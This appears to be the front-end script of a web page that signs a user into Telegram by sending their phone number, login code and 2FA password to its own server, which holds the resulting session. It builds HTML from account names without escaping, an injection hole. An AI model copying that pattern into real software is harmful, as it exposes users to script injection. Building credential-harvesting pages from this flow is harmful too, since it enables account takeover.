let sessionId = null;

// Alert functions
function showAlert(message, type = 'error') {
    const alert = document.getElementById('alert');
    alert.className = `alert alert-${type} show`;
    alert.textContent = message;
    
    setTimeout(() => {
        alert.classList.remove('show');
    }, 5000);
}

// Step navigation
function showStep(stepName) {
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(`step-${stepName}`).classList.add('active');
}

// Button loading state
function setButtonLoading(button, loading, text = '') {
    if (loading) {
        button.disabled = true;
        button.innerHTML = '<div class="loader"></div>';
    } else {
        button.disabled = false;
        button.innerHTML = text;
    }
}

// Send code
async function sendCode() {
    const phone = document.getElementById('phone').value.trim();
    
    if (!phone) {
        showAlert('Введите номер телефона');
        return;
    }
    
    const button = event.target;
    const originalHTML = button.innerHTML;
    setButtonLoading(button, true);
    
    try {
        const response = await fetch('/api/send_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone })
        });
        
        const data = await response.json();
        
        if (data.success) {
            if (data.already_authorized) {
                sessionId = data.session_id;
                showUserInfo(data.user);
                showStep('success');
                showAlert('Аккаунт уже авторизован!', 'success');
            } else {
                sessionId = data.session_id;
                showStep('code');
                showAlert('Код отправлен в Telegram', 'info');
            }
        } else {
            showAlert(data.error || 'Ошибка отправки кода');
        }
    } catch (error) {
        showAlert('Ошибка соединения: ' + error.message);
    } finally {
        setButtonLoading(button, false, originalHTML);
    }
}

// Verify code
async function verifyCode() {
    const code = document.getElementById('code').value.trim();
    
    if (!code) {
        showAlert('Введите код');
        return;
    }
    
    const button = event.target;
    const originalHTML = button.innerHTML;
    setButtonLoading(button, true);
    
    try {
        const response = await fetch('/api/verify_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: sessionId, code })
        });
        
        const data = await response.json();
        
        if (data.success) {
            if (data.needs_password) {
                showStep('password');
                showAlert('Требуется пароль 2FA', 'info');
            } else {
                showUserInfo(data.user);
                showStep('success');
                showAlert('Авторизация успешна!', 'success');
            }
        } else {
            showAlert(data.error || 'Неверный код');
        }
    } catch (error) {
        showAlert('Ошибка соединения: ' + error.message);
    } finally {
        setButtonLoading(button, false, originalHTML);
    }
}

// Verify password
async function verifyPassword() {
    const password = document.getElementById('password').value;
    
    if (!password) {
        showAlert('Введите пароль');
        return;
    }
    
    const button = event.target;
    const originalHTML = button.innerHTML;
    setButtonLoading(button, true);
    
    try {
        const response = await fetch('/api/verify_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_id: sessionId, password })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showUserInfo(data.user);
            showStep('success');
            showAlert('Авторизация успешна!', 'success');
        } else {
            showAlert(data.error || 'Неверный пароль');
        }
    } catch (error) {
        showAlert('Ошибка соединения: ' + error.message);
    } finally {
        setButtonLoading(button, false, originalHTML);
    }
}

// Show user info
function showUserInfo(user) {
    const userInfo = document.getElementById('user-info');
    userInfo.innerHTML = `
        <p><strong>Имя:</strong> ${user.first_name}</p>
        <p><strong>Username:</strong> @${user.username || 'нет'}</p>
        <p><strong>ID:</strong> ${user.id}</p>
    `;
}

// Enter key handlers
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('phone').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendCode();
    });
    
    document.getElementById('code').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') verifyCode();
    });
    
    document.getElementById('password').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') verifyPassword();
    });
});
